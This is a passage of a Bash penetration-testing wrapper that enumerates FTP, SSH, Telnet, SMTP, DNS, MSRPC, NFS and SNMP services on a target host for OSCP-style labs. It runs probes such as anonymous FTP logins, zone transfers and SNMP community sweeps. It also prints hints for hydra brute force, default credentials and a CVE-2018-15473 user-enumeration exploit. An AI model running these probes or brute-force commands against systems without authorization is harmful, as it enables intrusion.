#!/usr/bin/env bash
# =============================================================================
#  wrappers/services_enum.sh — Service-specific Enumeration Wrapper
#  Covers: FTP, SSH, SNMP, SMTP, NFS, IMAP/POP3, RDP/WinRM, Databases,
#          Redis, banner grabbing for unknown ports.
#
#  OSCP compliance:
#    - Anonymous / unauthenticated enumeration only
#    - No brute-force automation (manual hints provided instead)
#    - No exploitation (Redis CONFIG SET → hint only, impacket → hint only)
#    - Prints every command before execution
#
#  Usage:
#    bash wrappers/services_enum.sh --target <IP> --output-dir <DIR> \
#         --ports <comma-list> [--udp-ports <comma-list>] [--domain <DOMAIN>]
#
#  Output directories created as needed under <DIR>/
# =============================================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; WHITE='\033[1;37m'; NC='\033[0m'; BOLD='\033[1m'
# Disable ANSI colors when stdout is not a TTY (e.g. piped to Python)
[ -t 1 ] || { RED=""; GREEN=""; YELLOW=""; CYAN=""; WHITE=""; NC=""; BOLD=""; }

info() { echo -e "  ${CYAN}[*]${NC} $*"; }
ok()   { echo -e "  ${GREEN}[+]${NC} $*"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $*"; }
err()  { echo -e "  ${RED}[-]${NC} $*"; }
cmd()  { echo -e "  ${YELLOW}[CMD]${NC} $*"; }
hint() { echo -e "\n  ${YELLOW}[MANUAL]${NC} $*\n"; }
skip() { echo -e "  ${YELLOW}[SKIP]${NC} $1 not installed — skipping."; }

has_port() {
    echo ",$PORTS," | grep -q ",$1,"
}
has_udp_port() {
    [[ -z "$UDP_PORTS" ]] && return 1
    echo ",$UDP_PORTS," | grep -q ",$1,"
}

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
TARGET=""; OUTPUT_DIR=""; PORTS=""; UDP_PORTS=""; DOMAIN=""; RMI_PORTS=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)     TARGET="$2";     shift 2 ;;
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        --ports)      PORTS="$2";      shift 2 ;;
        --udp-ports)  UDP_PORTS="$2";  shift 2 ;;
        --domain)     DOMAIN="$2";     shift 2 ;;
        --rmi-ports)  RMI_PORTS="$2";  shift 2 ;;
        *) err "Unknown argument: $1"; exit 1 ;;
    esac
done

if [[ -z "$TARGET" || -z "$OUTPUT_DIR" ]]; then
    err "Usage: $0 --target <IP> --output-dir <DIR> --ports <PORTS>"
    exit 1
fi

echo ""
echo -e "  ${BOLD}============================================================${NC}"
echo -e "  ${BOLD}  SERVICES ENUM — ${TARGET}${NC}"
echo -e "  ${BOLD}  TCP ports : ${PORTS:-none}${NC}"
[[ -n "$UDP_PORTS" ]] && echo -e "  ${BOLD}  UDP ports : ${UDP_PORTS}${NC}"
echo -e "  ${BOLD}============================================================${NC}"
echo ""

# ===========================================================================
# Per-step interrupt handler
# Ctrl+C (1st) → skip step, continue  |  Ctrl+C (2nd, <5s) → abort module
# ===========================================================================
STEP_SKIPPED=false; _LAST_SIGINT_TS=0; SKIP_ABORT_WINDOW=5
_sigint_step() {
    local now; now=$(date +%s)
    if (( now - _LAST_SIGINT_TS < SKIP_ABORT_WINDOW )); then
        warn "Second Ctrl+C — aborting enumeration for ${TARGET}"; exit 130
    fi
    _LAST_SIGINT_TS=$now; STEP_SKIPPED=true
    echo ""; warn "⚡ Step interrupted — continuing to next step"
    warn "   (press Ctrl+C again within ${SKIP_ABORT_WINDOW}s to abort entire module)"; echo ""
}
trap '_sigint_step' INT

# ===========================================================================
# FTP — port 21
# ===========================================================================
if has_port 21; then
    FTP_DIR="${OUTPUT_DIR}/ftp"
    mkdir -p "$FTP_DIR"
    info "[FTP] Port 21 — anonymous login test"

    cmd "ftp -nv $TARGET (anonymous login probe)"
    FTP_RESULT=$(timeout 10 bash -c \
        "printf 'user anonymous anonymous\nls -la\npwd\nquit\n' | ftp -nv ${TARGET} 21" \
        2>&1 || true)
    echo "$FTP_RESULT" > "${FTP_DIR}/ftp_anon_test.txt"

    if echo "$FTP_RESULT" | grep -qiE '230|logged in|Login successful'; then
        ok "FTP anonymous login: ${RED}PERMITTED${NC}"
        ok "Files available — listing saved to ${FTP_DIR}/ftp_anon_test.txt"

        hint "Download all FTP files (run manually):
    wget -m --no-passive ftp://anonymous:anonymous@${TARGET}/
    # Or interactively:
    ftp ${TARGET}
    > user anonymous
    > prompt OFF
    > recurse ON
    > mget *"

    else
        info "FTP anonymous login: denied."
    fi

    # NSE FTP scripts
    cmd "nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -Pn $TARGET"
    nmap -p21 \
        --script 'ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor' \
        -Pn "$TARGET" \
        -oN "${FTP_DIR}/nmap_ftp.txt" 2>&1 | tee "${FTP_DIR}/nmap_ftp.txt" || {
        warn "nmap (FTP) failed — output may be incomplete. Check ${FTP_DIR}/nmap_ftp.txt for details."
    } # IMP-7 applied

    # Flag vsftpd backdoor
    if grep -qi "vsftpd.*backdoor\|VULNERABLE" "${FTP_DIR}/nmap_ftp.txt" 2>/dev/null; then
        warn "FTP: vsftpd backdoor VULNERABLE — review ${FTP_DIR}/nmap_ftp.txt"
    fi

    # Recursive directory listing (safe — no download, just tree)
    if echo "$FTP_RESULT" | grep -qiE '230|logged in|Login successful'; then
        info "[FTP] Anonymous login confirmed — getting recursive directory listing"
        FTP_TREE="${FTP_DIR}/ftp_tree.txt"
        cmd "ftp -nv $TARGET (recursive ls -R — listing only, no download)"
        timeout 30 bash -c \
            "printf 'user anonymous anonymous\nls -R\nquit\n' | ftp -nv ${TARGET} 21" \
            2>&1 | tee "$FTP_TREE" || true

        FILE_COUNT=$(grep -cP '^-' "$FTP_TREE" 2>/dev/null || echo 0)
        DIR_COUNT=$(grep -cP '^d' "$FTP_TREE" 2>/dev/null || echo 0)
        ok "FTP tree: ~${FILE_COUNT} files, ~${DIR_COUNT} directories → ${FTP_TREE}"

        # Flag interesting extensions in the tree
        INTERESTING_FTP=$(grep -iP '\.(ps1|bat|cmd|vbs|conf|config|ini|bak|old|zip|sql|key|pem|pfx|txt|xml|log)$' \
            "$FTP_TREE" 2>/dev/null | head -20 || true)
        if [[ -n "$INTERESTING_FTP" ]]; then
            warn "Potentially interesting files visible via anonymous FTP:"
            echo "$INTERESTING_FTP"
            echo "$INTERESTING_FTP" > "${FTP_DIR}/ftp_interesting.txt"
        fi

        hint "Download ALL files (run manually — check available disk space first):
    wget -m --no-passive --no-check-certificate ftp://anonymous:anonymous@${TARGET}/
    # Files download to ./${TARGET}/ in current directory.
    # Use --limit-rate=500k if VPN is unstable."
    fi

    hint "FTP brute force (manual — only if explicitly authorized):
    hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://${TARGET}"
    echo ""
fi

# ===========================================================================
# SSH — port 22
#
# Encapsulated in ssh_enum() so the auth-method probe runs ONCE against the
# server (not once per candidate user).  The previous per-user loop produced
# misleading "[+] SSH accepts password auth for user: root/admin/..." lines
# — nmap's ssh-auth-methods only reports which auth methods the SERVER
# advertises, it never validates whether a specific username exists.
# ===========================================================================
ssh_enum() {
    mkdir -p "${OUTPUT_DIR}/ssh"
    local ssh_dir="${OUTPUT_DIR}/ssh"

    info "[SSH] Port 22 — banner grab + audit + auth-method enumeration"

    # ---- Banner grab (raw TCP, no auth attempt) --------------------------
    local banner_file="${ssh_dir}/ssh_banner.txt"
    cmd "nc -nv -w 3 $TARGET 22 (SSH banner)"
    local banner
    banner=$(timeout 5 bash -c "echo '' | nc -nv -w 3 $TARGET 22" 2>&1 || true)
    echo "$banner" > "$banner_file"

    # Extract the SSH-2.0-* banner line (server version string)
    local ssh_version
    ssh_version=$(echo "$banner" | grep -oP 'SSH-[0-9.]+-\S+' | head -1 || true)
    [[ -n "$ssh_version" ]] && ok "SSH banner: ${WHITE}${ssh_version}${NC}"

    # ---- OpenSSH version detection (CVE-2018-15473 — user enum by timing) ----
    # Real user enumeration vulnerability: OpenSSH ≤ 7.7 reveals whether a
    # user exists via response-time differences during SSH2_MSG_USERAUTH_REQUEST.
    if [[ -n "$ssh_version" ]] && echo "$ssh_version" | grep -qi 'openssh'; then
        local openssh_ver
        openssh_ver=$(echo "$ssh_version" | grep -oP 'OpenSSH_\K[0-9]+\.[0-9]+[p0-9]*' | head -1 || true)
        if [[ -n "$openssh_ver" ]]; then
            local major minor
            major=$(echo "$openssh_ver" | cut -d. -f1)
            minor=$(echo "$openssh_ver" | cut -d. -f2 | grep -oE '^[0-9]+' || echo 0)
            if (( major < 7 )) || (( major == 7 && minor <= 7 )); then
                warn "${RED}CRITICAL: OpenSSH ${openssh_ver} ≤ 7.7 — CVE-2018-15473 (real user enumeration via timing)${NC}"
                {
                    echo "CVE-2018-15473 — OpenSSH ≤ 7.7 username enumeration"
                    echo "Version detected: ${openssh_ver}"
                    echo "Exploit: searchsploit 45233"
                    echo "Usage:   python3 45233.py ${TARGET} -p 22 -u users.txt"
                } > "${ssh_dir}/ssh_cve_2018_15473.txt"
                ok "CVE details → ${WHITE}${ssh_dir}/ssh_cve_2018_15473.txt${NC}"
            fi
        fi
    fi

    # ---- ssh-audit (keeps rich CVE + algorithm analysis if installed) ----
    if command -v ssh-audit &>/dev/null; then
        local ssh_audit_out="${ssh_dir}/ssh_audit.txt"
        cmd "ssh-audit --skip-rate-test $TARGET"
        ssh-audit --skip-rate-test "$TARGET" 2>&1 \
            | sed 's/\x1b\[[0-9;]*m//g' \
            > "$ssh_audit_out" || true

        echo ""
        info "[SSH-AUDIT] Summary (full output → ${ssh_audit_out})"
        grep -E '^\(gen\)|^\(fin\)|\[fail\].*CVE-|\[warn\].*CVE-|\[fail\].*broken|\[fail\].*deprecated' \
            "$ssh_audit_out" 2>/dev/null \
            | while IFS= read -r line; do
                echo "  $line"
              done || true

        if grep -qiE 'CVE-' "$ssh_audit_out" 2>/dev/null; then
            local ssh_cves
            ssh_cves=$(grep -oP 'CVE-\d+-\d+' "$ssh_audit_out" 2>/dev/null \
                | sort -u | head -5 | tr '\n' ' ' || true)
            warn "SSH CVEs (from ssh-audit): ${RED}${ssh_cves}${NC}"
        else
            ok "No CVEs flagged by ssh-audit"
        fi
        echo ""
    else
        skip "ssh-audit"
        hint "Install ssh-audit:  pip3 install ssh-audit"
    fi

    # ---- Weak algorithm detection via NSE (independent signal) ----
    local algos_out="${ssh_dir}/ssh2_enum_algos.txt"
    cmd "nmap -p22 --script ssh2-enum-algos -Pn $TARGET"
    nmap -p22 --script ssh2-enum-algos -Pn "$TARGET" \
        -oN "$algos_out" 2>&1 | tee "$algos_out" || true

    if grep -qiE '(diffie-hellman-group1-sha1|diffie-hellman-group-exchange-sha1|arcfour|3des-cbc|blowfish-cbc|hmac-md5|hmac-sha1-96)' \
            "$algos_out" 2>/dev/null; then
        warn "SSH weak algorithm(s) offered — review ${algos_out}"
    fi

    # ---- Advertised auth methods (server-wide, NOT per-user) ----
    # Probes with a throwaway username so the answer reflects what the server
    # accepts in principle, not whether the username exists.
    local auth_probe_out="${ssh_dir}/ssh_auth_methods.txt"
    cmd "nmap -p22 --script ssh-auth-methods --script-args ssh.user=oscp-probe -Pn $TARGET"
    nmap -p22 --script ssh-auth-methods \
        --script-args 'ssh.user=oscp-probe' -Pn "$TARGET" \
        -oN "$auth_probe_out" 2>&1 | tee "$auth_probe_out" || true

    local auth_methods
    auth_methods=$(grep -oP 'Supported authentication methods[^)]*\)\s*\K.*' "$auth_probe_out" 2>/dev/null \
        | head -1 | tr -d '\r' || true)
    if [[ -z "$auth_methods" ]]; then
        # Fallback: extract the listed methods under the "auth methods" block
        auth_methods=$(grep -A4 'ssh-auth-methods' "$auth_probe_out" 2>/dev/null \
            | grep -oE '(publickey|password|keyboard-interactive|hostbased|gssapi-with-mic|none)' \
            | sort -u | tr '\n' ',' | sed 's/,$//' || true)
    fi

    if [[ -n "$auth_methods" ]]; then
        info "SSH server advertises auth methods: ${WHITE}${auth_methods}${NC}  (NO confirma existencia de users)"
        echo "auth_methods=${auth_methods}" >> "$auth_probe_out"
    else
        info "Could not parse advertised auth methods — review ${auth_probe_out}"
    fi

    # ---- Host keys (ssh-keyscan) ----
    if command -v ssh-keyscan &>/dev/null; then
        local hostkey_out="${ssh_dir}/ssh_hostkeys.txt"
        cmd "ssh-keyscan -T 5 $TARGET"
        ssh-keyscan -T 5 "$TARGET" 2>/dev/null > "$hostkey_out" || true
        if [[ -s "$hostkey_out" ]]; then
            local key_count
            key_count=$(wc -l < "$hostkey_out" 2>/dev/null || echo 0)
            ok "SSH host keys saved (${key_count} entries) → ${WHITE}${hostkey_out}${NC}"
        fi
    else
        skip "ssh-keyscan"
    fi

    hint "SSH brute force (manual — only if explicitly authorized):
    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://${TARGET}

    # Private key login (if you find id_rsa):
    ssh -i id_rsa <user>@${TARGET}"
    echo ""
}

if has_port 22; then
    ssh_enum
fi

# ===========================================================================
# Telnet — port 23
# ===========================================================================
if has_port 23; then
    TELNET_DIR="${OUTPUT_DIR}/telnet"
    mkdir -p "$TELNET_DIR"
    info "[Telnet] Port 23 — banner grab + NTLM info probe"

    # Banner grab (raw nc — Telnet sends banner immediately)
    cmd "nc -nv -w 5 $TARGET 23 (Telnet banner)"
    TELNET_BANNER=$(timeout 5 bash -c "echo '' | nc -nv -w 5 $TARGET 23" 2>&1 || true)
    echo "$TELNET_BANNER" > "${TELNET_DIR}/telnet_banner.txt"

    if [[ -n "$TELNET_BANNER" ]]; then
        BANNER_LINE=$(echo "$TELNET_BANNER" | grep -v '^$' | head -3 | tr '\n' ' ' | cut -c1-120 || true)
        ok "Telnet banner: ${WHITE}${BANNER_LINE}${NC}"
    else
        info "No Telnet banner received — service may be filtered or require auth prompt."
    fi

    # Nmap Telnet scripts (NTLM info disclosure reveals hostname/domain on Windows Telnet)
    cmd "nmap -p23 --script telnet-ntlm-info,telnet-encryption -Pn $TARGET"
    nmap -p23 \
        --script 'telnet-ntlm-info,telnet-encryption' \
        -Pn "$TARGET" \
        -oN "${TELNET_DIR}/telnet_nmap.txt" 2>&1 | tee "${TELNET_DIR}/telnet_nmap.txt" || {
        warn "nmap (Telnet) failed — output may be incomplete. Check ${TELNET_DIR}/telnet_nmap.txt for details."
    } # IMP-7 applied

    if grep -qi "Target_Name\|NetBIOS\|Domain_Name" "${TELNET_DIR}/telnet_nmap.txt" 2>/dev/null; then
        ok "Telnet NTLM info disclosure — hostname/domain extracted (check telnet_nmap.txt)"
    fi

    hint "Telnet manual interaction:
    telnet ${TARGET}
    # Default credentials to try: admin/admin, cisco/cisco, root/root, admin/(blank)
    # For Cisco/network devices: enable → show version, show ip interface brief, show run
    # For Windows Telnet server: check if NTLMv2 auth is possible via telnet client"
    echo ""
fi

# ===========================================================================
# SMTP — port 25
# ===========================================================================
if has_port 25; then
    SMTP_DIR="${OUTPUT_DIR}/smtp"
    mkdir -p "$SMTP_DIR"
    info "[SMTP] Port 25 — SMTP banner + user enumeration"

    cmd "nmap -p25 --script smtp-commands,smtp-enum-users,smtp-vuln* -Pn $TARGET"
    nmap -p25 \
        --script 'smtp-commands,smtp-enum-users,smtp-vuln*' \
        -Pn "$TARGET" \
        -oN "${SMTP_DIR}/nmap_smtp.txt" 2>&1 | tee "${SMTP_DIR}/nmap_smtp.txt" || {
        warn "nmap (SMTP) failed — output may be incomplete. Check ${SMTP_DIR}/nmap_smtp.txt for details."
    } # IMP-7 applied

    # smtp-user-enum — prefer existing user lists from prior modules (smb/ldap)
    # to avoid generic wordlists and reduce noise.
    SMTP_UE_WL=""
    for CANDIDATE in \
        "${OUTPUT_DIR}/smb/users_rpc.txt" \
        "${OUTPUT_DIR}/ldap/ldap_users.txt" \
        "/usr/share/seclists/Usernames/Names/names.txt" \
        "/usr/share/wordlists/metasploit/unix_users.txt"; do
        if [[ -s "$CANDIDATE" ]]; then
            SMTP_UE_WL="$CANDIDATE"
            break
        fi
    done

    if command -v smtp-user-enum &>/dev/null && [[ -n "$SMTP_UE_WL" ]]; then
        # Step 1 — VRFY method
        cmd "smtp-user-enum -M VRFY -U $SMTP_UE_WL -t $TARGET"
        smtp-user-enum -M VRFY -U "$SMTP_UE_WL" -t "$TARGET" \
            2>&1 | tee "${SMTP_DIR}/smtp_users_vrfy.txt" || true

        VRFY_HITS=$(grep -c 'exists\|250\|OK' "${SMTP_DIR}/smtp_users_vrfy.txt" 2>/dev/null || echo 0)

        # Step 2 — RCPT fallback if VRFY returned nothing or was rejected
        if [[ "$VRFY_HITS" -eq 0 ]] || grep -qi "not implemented\|502\|Disallowed\|disabled" \
            "${SMTP_DIR}/smtp_users_vrfy.txt" 2>/dev/null; then
            info "VRFY returned no results — falling back to RCPT method"
            cmd "smtp-user-enum -M RCPT -U $SMTP_UE_WL -t $TARGET"
            smtp-user-enum -M RCPT -U "$SMTP_UE_WL" -t "$TARGET" \
                2>&1 | tee "${SMTP_DIR}/smtp_users_rcpt.txt" || true
            # Merge both outputs
            cat "${SMTP_DIR}/smtp_users_vrfy.txt" "${SMTP_DIR}/smtp_users_rcpt.txt" \
                > "${SMTP_DIR}/smtp_users.txt" 2>/dev/null || true
        else
            cp "${SMTP_DIR}/smtp_users_vrfy.txt" "${SMTP_DIR}/smtp_users.txt" 2>/dev/null || true
        fi

        SMTP_VALID=$(grep -oP '(?<=\] )\S+(?= exists)' "${SMTP_DIR}/smtp_users.txt" 2>/dev/null \
            | sort -u || true)
        if [[ -n "$SMTP_VALID" ]]; then
            ok "SMTP valid users: ${WHITE}$(echo "$SMTP_VALID" | tr '\n' ' ')${NC}"
        fi
    else
        hint "SMTP user enumeration (manual):
    # VRFY method:
    smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t ${TARGET}
    # RCPT fallback (if VRFY disabled):
    smtp-user-enum -M RCPT -U ${OUTPUT_DIR}/smb/users_rpc.txt -t ${TARGET}"
    fi

    hint "SMTP open relay test (manual):
    swaks --to root@localhost --from test@test.com --server ${TARGET}"
    echo ""
fi

# ===========================================================================
# DNS — port 53
# ===========================================================================
if has_port 53; then
    DNS_DIR="${OUTPUT_DIR}/dns"
    mkdir -p "$DNS_DIR"
    info "[DNS] Port 53 — DNS enumeration"

    cmd "nmap -p53 --script dns-nsid,dns-recursion,dns-service-discovery -Pn $TARGET"
    nmap -p53 \
        --script 'dns-nsid,dns-recursion,dns-service-discovery' \
        -Pn "$TARGET" \
        -oN "${DNS_DIR}/dns_nmap.txt" 2>&1 | tee "${DNS_DIR}/dns_nmap.txt" || {
        warn "nmap (DNS) failed — output may be incomplete. Check ${DNS_DIR}/dns_nmap.txt for details."
    } # IMP-7 applied

    if grep -qi "dns-recursion.*Recursion.*enabled\|Recursion: enabled" \
        "${DNS_DIR}/dns_nmap.txt" 2>/dev/null; then
        warn "DNS recursion ENABLED — potential DNS amplification risk."
    fi

    # Reverse PTR lookup — also used to auto-extract domain if --domain not supplied
    cmd "host $TARGET"
    host "$TARGET" 2>&1 | tee "${DNS_DIR}/ptr_lookup.txt" || true

    # Auto-extract domain from PTR result (e.g. "10.0.0.5.in-addr.arpa → dc01.corp.local")
    if [[ -z "$DOMAIN" ]]; then
        PTR_DOMAIN=$(grep -oP '\S+\.\S+\.\S+(?=\.$)' "${DNS_DIR}/ptr_lookup.txt" 2>/dev/null \
            | grep -v 'in-addr\|arpa' | head -1 | sed 's/^[^.]*\.//' || true)

        # Fallback 1: LDAP base DN already discovered by ldap_enum.sh
        if [[ -z "$PTR_DOMAIN" && -f "${OUTPUT_DIR}/ldap/base_dn.txt" ]]; then
            BASE_DN=$(cat "${OUTPUT_DIR}/ldap/base_dn.txt" 2>/dev/null || true)
            if [[ -n "$BASE_DN" ]]; then
                # Convert DC=corp,DC=local → corp.local
                PTR_DOMAIN=$(echo "$BASE_DN" \
                    | grep -oP 'DC=\K[^,]+' | tr '\n' '.' | sed 's/\.$//' || true)
            fi
        fi

        # Fallback 2: domain from SMB enum4linux output
        if [[ -z "$PTR_DOMAIN" && -f "${OUTPUT_DIR}/smb/enum4linux.txt" ]]; then
            PTR_DOMAIN=$(grep -oP '(?i)Domain:\s*\K\S+' \
                "${OUTPUT_DIR}/smb/enum4linux.txt" 2>/dev/null | head -1 || true)
        fi

        if [[ -n "$PTR_DOMAIN" ]]; then
            DOMAIN="$PTR_DOMAIN"
            ok "Domain auto-detected: ${WHITE}${DOMAIN}${NC} (zone transfer will be attempted)"
            echo "$DOMAIN" > "${DNS_DIR}/domain_detected.txt"
        else
            info "No domain detected automatically — zone transfer skipped (supply --domain <DOMAIN> to force)."
        fi
    fi

    # ANY query
    cmd "dig @$TARGET any ."
    dig "@${TARGET}" any . 2>&1 | tee "${DNS_DIR}/dns_any.txt" || true

    # Zone transfer and subdomain brute if domain is known
    if [[ -n "$DOMAIN" ]]; then
        cmd "dig axfr $DOMAIN @$TARGET"
        dig axfr "$DOMAIN" "@${TARGET}" \
            2>&1 | tee "${DNS_DIR}/zone_transfer.txt" || true

        if grep -q "XFR size" "${DNS_DIR}/zone_transfer.txt" 2>/dev/null; then
            ok "Zone transfer SUCCESSFUL — see ${DNS_DIR}/zone_transfer.txt"
        else
            info "Zone transfer denied (expected on hardened servers)."
        fi

        # TXT records — contain SPF, DMARC, domain verification tokens,
        # and sometimes internal service info (Azure, O365, etc.)
        cmd "dig TXT $DOMAIN @$TARGET"
        dig TXT "$DOMAIN" "@${TARGET}" \
            2>&1 | tee "${DNS_DIR}/dns_txt.txt" || true

        TXT_COUNT=$(grep -c '"' "${DNS_DIR}/dns_txt.txt" 2>/dev/null || echo 0)
        if [[ "$TXT_COUNT" -gt 0 ]]; then
            ok "DNS TXT records found (${TXT_COUNT}) — see ${DNS_DIR}/dns_txt.txt"
            # Flag cloud/SaaS indicators commonly seen in OSCP labs
            if grep -qiE 'v=spf|MS=|google-site|_domainkey|azure|o365|office365' \
                "${DNS_DIR}/dns_txt.txt" 2>/dev/null; then
                warn "DNS TXT: cloud/SaaS indicators found — domain may have external presence"
            fi
        fi

        if command -v dnsrecon &>/dev/null; then
            cmd "dnsrecon -d $DOMAIN -t axfr,brt,std -n $TARGET"
            dnsrecon -d "$DOMAIN" -t axfr,brt,std -n "$TARGET" \
                2>&1 | tee "${DNS_DIR}/dnsrecon.txt" || true
        fi
    fi

    hint "Manual DNS steps:
  dig axfr <DOMAIN> @${TARGET}
  dig TXT <DOMAIN> @${TARGET}
  dnsrecon -d <DOMAIN> -t axfr
  gobuster dns -d <DOMAIN> -r ${TARGET} \\
      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20
  dnsx -d <DOMAIN> -r ${TARGET} -a -cname -txt -resp"
    echo ""
fi

# ===========================================================================
# MSRPC — port 135 (RPC Endpoint Mapper)
# ===========================================================================
if has_port 135; then
    MSRPC_DIR="${OUTPUT_DIR}/msrpc"
    mkdir -p "$MSRPC_DIR"
    info "[MSRPC] Port 135 — RPC endpoint mapper enumeration"

    # Nmap MSRPC scripts
    cmd "nmap -p135 --script msrpc-enum -Pn $TARGET"
    nmap -p135 \
        --script 'msrpc-enum' \
        -Pn "$TARGET" \
        -oN "${MSRPC_DIR}/msrpc_nmap.txt" 2>&1 | tee "${MSRPC_DIR}/msrpc_nmap.txt" || {
        warn "nmap (MSRPC) failed — output may be incomplete. Check ${MSRPC_DIR}/msrpc_nmap.txt for details."
    } # IMP-7 applied

    # impacket-rpcdump — dumps all registered RPC endpoints anonymously
    if command -v impacket-rpcdump &>/dev/null; then
        cmd "impacket-rpcdump @$TARGET"
        impacket-rpcdump "@$TARGET" \
            2>&1 | tee "${MSRPC_DIR}/rpcdump.txt" || true

        # Flag high-value RPC interfaces
        INTERESTING_RPC=$(grep -iE \
            'svcctl|samr|lsarpc|drsuapi|epmapper|atsvc|schedsvc|IRemoteActivation|wkssvc|srvsvc' \
            "${MSRPC_DIR}/rpcdump.txt" 2>/dev/null | head -20 || true)
        if [[ -n "$INTERESTING_RPC" ]]; then
            ok "Interesting RPC endpoints found — see ${MSRPC_DIR}/rpcdump.txt"
            echo "$INTERESTING_RPC"
        fi

        # SAMR/LSARPC indicate domain user/group enumeration is possible
        if grep -qiE 'samr|lsarpc' "${MSRPC_DIR}/rpcdump.txt" 2>/dev/null; then
            warn "SAMR/LSARPC endpoints detected — anonymous user enumeration may be possible"
        fi
    else
        skip "impacket-rpcdump"
        hint "Install impacket: pip3 install impacket
    Then: impacket-rpcdump @${TARGET}"
    fi

    hint "MSRPC manual enumeration:
    impacket-rpcdump @${TARGET}                    ← anonymous endpoint dump
    nmap -p135 --script msrpc-enum -Pn ${TARGET}  ← NSE endpoint mapper
    # SAMR user enumeration (if SAMR endpoint present):
    impacket-samrdump ${TARGET}
    # Authenticated dump (if credentials known):
    impacket-rpcdump -u USER -p PASS @${TARGET}"
    echo ""
fi

# ===========================================================================
# NFS — ports 111 / 2049
# ===========================================================================
if has_port 2049 || has_port 111; then
    mkdir -p "${OUTPUT_DIR}/nfs"
    info "[NFS] Ports 111/2049 — RPC portmapper + share enumeration"

    # Step 1 — RPC portmapper dump (always run first — reveals all RPC services)
    if command -v rpcinfo &>/dev/null; then
        cmd "rpcinfo -p $TARGET"
        rpcinfo -p "$TARGET" \
            2>&1 | tee "${OUTPUT_DIR}/nfs/rpcinfo.txt" || true

        # Flag NFS service versions
        NFS_VERS=$(grep -i '\bnfs\b' "${OUTPUT_DIR}/nfs/rpcinfo.txt" 2>/dev/null \
            | awk '{print "NFS v"$2" ("$3") port "$4}' | sort -u || true)
        [[ -n "$NFS_VERS" ]] && ok "RPC NFS versions: ${WHITE}${NFS_VERS}${NC}"
    else
        hint "Install rpcinfo: sudo apt-get install nfs-common"
    fi

    # Step 2 — Nmap NFS scripts (enumerate exports + file listings without mounting)
    NFS_NMAP="${OUTPUT_DIR}/nfs/nfs_nmap.txt"
    cmd "nmap -p111,2049 --script nfs-ls,nfs-showmount,nfs-statfs,rpcinfo -Pn $TARGET"
    nmap -p111,2049 \
        --script 'nfs-ls,nfs-showmount,nfs-statfs,rpcinfo' \
        -Pn "$TARGET" \
        -oN "$NFS_NMAP" 2>&1 | tee "$NFS_NMAP" || true

    # Flag no_root_squash
    if grep -qi "no_root_squash" "$NFS_NMAP" 2>/dev/null; then
        warn "NFS: no_root_squash detected — SUID binary plant via local root mount is possible"
    fi

    # Step 3 — showmount export list
    NFS_SHARES="${OUTPUT_DIR}/nfs/nfs_shares.txt"
    cmd "showmount -e $TARGET"
    showmount -e "$TARGET" 2>&1 | tee "$NFS_SHARES" || true

    if grep -qP '^\/' "$NFS_SHARES" 2>/dev/null; then
        ok "NFS exports found — review ${NFS_SHARES}"

        while IFS= read -r NFS_LINE; do
            SHARE_PATH=$(echo "$NFS_LINE" | awk '{print $1}')
            [[ "$SHARE_PATH" != /* ]] && continue
            ok "  Export: ${WHITE}${TARGET}:${SHARE_PATH}${NC}"
        done < <(grep -P '^/' "$NFS_SHARES" 2>/dev/null)

        hint "Mount and explore NFS shares manually:
    sudo mkdir -p /mnt/nfs_enum
    sudo mount -t nfs ${TARGET}:<SHARE_PATH> /mnt/nfs_enum -o nolock
    ls -laR /mnt/nfs_enum/
    # Look for: id_rsa, authorized_keys, shadow, .bash_history, *.conf, *.bak
    sudo umount /mnt/nfs_enum

    # Check for no_root_squash:
    cat /etc/exports (on target, if you get RCE)"
    else
        info "No NFS exports found."
    fi
    echo ""
fi

# ===========================================================================
# SNMP — UDP port 161
# ===========================================================================
if has_udp_port 161; then
    SNMP_DIR="${OUTPUT_DIR}/snmp"
    mkdir -p "$SNMP_DIR"
    info "[SNMP] UDP 161 — community string brute + full walk"

    SNMP_WL="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt"
    [[ ! -f "$SNMP_WL" ]] && \
        SNMP_WL="/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt"
    [[ ! -f "$SNMP_WL" ]] && \
        SNMP_WL="/usr/share/wordlists/snmp.txt"

    if [[ ! -f "$SNMP_WL" ]]; then
        warn "No SNMP community wordlist found — skipping onesixtyone sweep."
        warn "Install seclists: sudo apt install seclists"
        warn "Trying snmpwalk with default 'public' community anyway."
    fi

    if command -v onesixtyone &>/dev/null && [[ -f "$SNMP_WL" ]]; then
        cmd "onesixtyone -c $SNMP_WL $TARGET"
        onesixtyone -c "$SNMP_WL" "$TARGET" \
            2>&1 | tee "${SNMP_DIR}/communities.txt" || true
    else
        warn "onesixtyone not found or no wordlist — trying snmpwalk with 'public' directly."
    fi

    # -----------------------------------------------------------------------
    # Pick the community string to walk with.
    # onesixtyone prints:  <IP> [community] Hardware: ...
    # Use the FIRST discovered community; fall back to 'public'. This fixes the
    # case where the box uses a non-public community (private/custom) — we now
    # walk with what actually works instead of assuming public.
    # -----------------------------------------------------------------------
    SNMP_COMM="public"
    if [[ -f "${SNMP_DIR}/communities.txt" ]]; then
        DISCOVERED=$(grep -oP '\[\K[^\]]+' "${SNMP_DIR}/communities.txt" 2>/dev/null | head -n1)
        if [[ -n "$DISCOVERED" ]]; then
            SNMP_COMM="$DISCOVERED"
            ok "SNMP community string discovered: '${SNMP_COMM}' — using it for all walks"
        fi
    fi

    # Full SNMP walk with the discovered/default community
    if command -v snmpwalk &>/dev/null; then
        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET"
        snmpwalk -v2c -c "$SNMP_COMM" "$TARGET" \
            2>&1 | tee "${SNMP_DIR}/snmpwalk_full.txt" || true

        # Targeted OID queries for high-value data
        cmd "snmpwalk -v2c -c $SNMP_COMM $TARGET 1.3.6.1.2.1.25.4.2.1.2 (running processes)"
